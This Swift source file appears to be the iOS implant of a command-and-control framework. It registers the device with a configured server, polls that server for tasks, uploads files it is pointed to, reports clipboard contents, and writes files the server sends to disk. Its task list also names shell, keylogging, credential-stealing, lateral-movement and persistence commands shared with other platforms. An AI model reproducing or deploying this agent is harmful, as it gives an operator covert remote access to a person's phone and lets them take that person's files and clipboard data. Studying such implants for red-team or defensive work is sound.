//
//  Wire-protocol agent core (register -> checkin -> execute -> result).
//  Kept synchronous (semaphore-backed URLSession) for simple control flow.
//
import Foundation
import UIKit

final class WymAgent {

    private let server = Config.server
    private let token = Config.token
    private var interval: Double = Double(max(1, Config.interval))
    private var agentId = UserDefaults.standard.string(forKey: "wym_agent_id") ?? ""
    private var stop = false
    private let onChange: () -> Void

    init(_ onChange: @escaping () -> Void) {
        self.onChange = onChange
    }

    func run() {
        while !stop {
            if agentId.isEmpty {
                register()
            }
            if let resp = post(path: "/api/checkin", body: ["agent_id": agentId]) {
                if let tasks = resp["tasks"] as? [[String: Any]] {
                    for t in tasks {
                        execute(task: t)
                    }
                }
            } else {
                agentId = "" // id lost server-side -> re-register next loop
                Thread.sleep(forTimeInterval: 3)
                continue
            }
            Thread.sleep(forTimeInterval: max(1, interval))
        }
        DispatchQueue.main.async { self.onChange() }
    }

    func stopNow() {
        stop = true
    }

    // MARK: transport

    private func sync(_ req: URLRequest) -> (Int, Data?) {
        let sem = DispatchSemaphore(value: 0)
        var status = 0
        var data: Data?
        URLSession.shared.dataTask(with: req) { d, r, _ in
            if let r = r as? HTTPURLResponse {
                status = r.statusCode
            }
            data = d
            sem.signal()
        }.resume()
        sem.wait()
        return (status, data)
    }

    private func request(_ path: String) -> URLRequest {
        var req = URLRequest(url: URL(string: server + path)!)
        req.timeoutInterval = 30
        req.setValue(token, forHTTPHeaderField: "X-Agent-Token")
        return req
    }

    private func post(path: String, body: [String: Any]) -> [String: Any]? {
        var req = request(path)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        let (status, data) = sync(req)
        guard status == 200, let data = data,
              let obj = try? JSONSerialization.jsonObject(with: data) else {
            return nil
        }
        return obj as? [String: Any]
    }

    private func postResult(taskId: String, output: String, exitCode: Int, error: String) {
        _ = post(path: "/api/result", body: [
            "task_id": taskId, "output": output,
            "exit_code": exitCode, "error": error,
        ])
    }

    // MARK: lifecycle

    private func register() {
        let body: [String: Any] = [
            "agent_id": agentId,
            "hostname": UIDevice.current.name,
            "username": UIDevice.current.name,
            "os": "ios",
            "arch": "arm64",
            "pid": Int(ProcessInfo.processInfo.processIdentifier),
            "ip": "",
            "os_version": UIDevice.current.systemVersion,
            "version": "1.0",
            "type": "iOS",
        ]
        if let resp = post(path: "/api/register", body: body),
           let id = resp["agent_id"] as? String {
            agentId = id
            UserDefaults.standard.set(id, forKey: "wym_agent_id")
        }
    }

    // MARK: task dispatch

    private func execute(task: [String: Any]) {
        let taskId = task["task_id"] as? String ?? ""
        let type = task["type"] as? String ?? ""
        let args = task["args"] as? [String: Any] ?? [:]

        switch type {
        case "download":
            download(taskId: taskId, args: args)
        case "upload":
            upload(taskId: taskId, args: args)
        case "sleep":
            let secs = max(1, args["seconds"] as? Int ?? 10)
            interval = Double(secs)
            postResult(taskId: taskId, output: "heartbeat interval set to \(secs)s", exitCode: 0, error: "")
        case "clipboard":
            clipboard(taskId: taskId, args: args)
        case "exit":
            postResult(taskId: taskId, output: "bye", exitCode: 0, error: "")
            stop = true
        default:
            let unsupported = ["shell", "keylog", "screenshot", "steal",
                               "lateral", "clone", "persistence"].contains(type)
            postResult(taskId: taskId,
                       output: unsupported ? "error: \(type) not supported on iOS" : "unknown task type: \(type)",
                       exitCode: unsupported ? 1 : 2, error: "")
        }
    }

    private func docsDir() -> URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }

    private func download(taskId: String, args: [String: Any]) {
        let name = args["file"] as? String ?? "payload.bin"
        let dest = args["destination"] as? String ?? ""
        var req = request("/api/files/\(taskId)")
        req.timeoutInterval = 120
        let (status, data) = sync(req)
        guard status == 200, let data = data else {
            postResult(taskId: taskId, output: "download failed: HTTP \(status)", exitCode: 1, error: "")
            return
        }
        let url: URL
        if !dest.isEmpty, FileManager.default.fileExists(atPath: dest) {
            url = URL(fileURLWithPath: dest).appendingPathComponent(name)
        } else if !dest.isEmpty && (dest as NSString).isAbsolutePath {
            url = URL(fileURLWithPath: dest)
        } else {
            url = docsDir().appendingPathComponent(name)
        }
        do {
            try data.write(to: url)
            postResult(taskId: taskId, output: "saved \(data.count) bytes to \(url.path)",
                       exitCode: 0, error: "")
        } catch {
            postResult(taskId: taskId, output: "error: \(error)", exitCode: 1, error: "")
        }
    }

    private func upload(taskId: String, args: [String: Any]) {
        let path = args["path"] as? String ?? ""
        var url = URL(fileURLWithPath: path)
        if !url.isFileURL && !FileManager.default.fileExists(atPath: path) {
            url = docsDir().appendingPathComponent(path)
        }
        guard FileManager.default.fileExists(atPath: url.path) else {
            postResult(taskId: taskId, output: "file not found: \(path)", exitCode: 1, error: "")
            return
        }
        let boundary = "----wym\(UInt32.random(in: 0 ..< UInt32.max))"
        var req = request("/api/files/\(taskId)")
        req.httpMethod = "POST"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        var data = Data()
        data.append("--\(boundary)\r\n".data(using: .utf8)!)
        data.append("Content-Disposition: form-data; name=\"file\"; filename=\"\(url.lastPathComponent)\"\r\n".data(using: .utf8)!)
        data.append("Content-Type: application/octet-stream\r\n\r\n".data(using: .utf8)!)
        if let fd = try? Data(contentsOf: url) {
            data.append(fd)
        }
        data.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
        req.httpBody = data
        req.timeoutInterval = 300
        let (status, _) = sync(req)
        postResult(taskId: taskId,
                   output: status < 300 ? "uploaded \(path)" : "upload failed: HTTP \(status)",
                   exitCode: status < 300 ? 0 : 1, error: "")
    }

    private func clipboard(taskId: String, args: [String: Any]) {
        let action = args["action"] as? String ?? "get"
        let pb = UIPasteboard.general
        if action == "set" {
            pb.string = args["text"] as? String ?? ""
            postResult(taskId: taskId, output: "clipboard set", exitCode: 0, error: "")
        } else {
            postResult(taskId: taskId, output: pb.string ?? "", exitCode: 0, error: "")
        }
    }
}